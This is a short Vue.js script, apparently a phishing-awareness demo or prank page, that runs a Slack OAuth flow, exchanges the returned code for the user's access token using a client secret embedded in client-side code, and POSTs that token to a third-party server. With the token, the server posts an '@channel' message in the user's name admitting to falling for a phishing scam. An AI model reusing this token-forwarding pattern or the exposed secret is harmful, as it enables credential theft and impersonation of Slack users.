const app = new Vue({
  el: '#app',
  data: {
    slackURL: "https://slack.com/oauth/v2/authorize?client_id=5999200353638.7824711114771&user_scope=channels%3Aread%2Cchat%3Awrite&redirect_uri=https://cuuupid.github.io/gp-slack/index.html"
  },
  async created() {
    // parse the query string and look for the code
    const params = new URLSearchParams(window.location.search)
    const code = params.get('code')
    if (code) {
      // perform following cURL as a fetch:
      const d = await fetch('https://slack.com/api/oauth.v2.access', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `code=${code}&client_id=5999200353638.7824711114771&client_secret=53380e863b92cd2faa9d44f409f13f53`
      }).then(s => s.json())
      console.log(d)
      if (d.ok) {
        const token = d.authed_user.access_token ?? d.access_token
        if (!token) throw new Error("No token provided.")
        const channel = "C07KV1FGYJ1"
        await fetch(`https://adams.govpro.ai:10919/slack`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token, channel, message: "<!channel> Help! I've fallen for a phishing scam and can't get up!" }),
        })
        window.location.href = `https://app.slack.com/client/T05VD5WADJS/${channel}`
      }
    } else window.location.href = this.slackURL
  }
})
